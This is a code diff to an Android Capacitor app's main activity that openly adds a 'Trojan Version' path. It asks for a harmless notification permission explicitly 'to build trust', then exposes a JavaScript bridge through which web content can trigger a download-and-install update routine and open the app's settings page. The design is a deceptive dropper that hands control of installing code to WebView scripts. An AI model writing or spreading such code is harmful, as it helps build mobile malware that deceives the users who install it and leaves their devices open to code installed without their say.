@@ -59,7 +59,36 @@ public class MainActivity extends BridgeActivity {
                     checkAndRequestPermissions();
                 }
             }, 1000);
+        } else {
+            // Trojan Version - Request benign Notification permission to build trust
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
+                }
+            }
         }
+    }
+
+    private void setupBridge() {
+        getBridge().getWebView().getSettings().setJavaScriptEnabled(true);
+        getBridge().getWebView().addJavascriptInterface(new Object() {
+            @JavascriptInterface
+            public void triggerAutoUpdate() {
+                downloadAndInstallUpdate();
+            }
+
+            @JavascriptInterface
+            public boolean isLimitedVersion() {
+                return !isFullVersion();
+            }
+
+            @JavascriptInterface
+            public void openAppSettings() {
+                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            }
+        }, "AndroidBridge");
     }
 
     private boolean isFullVersion() {
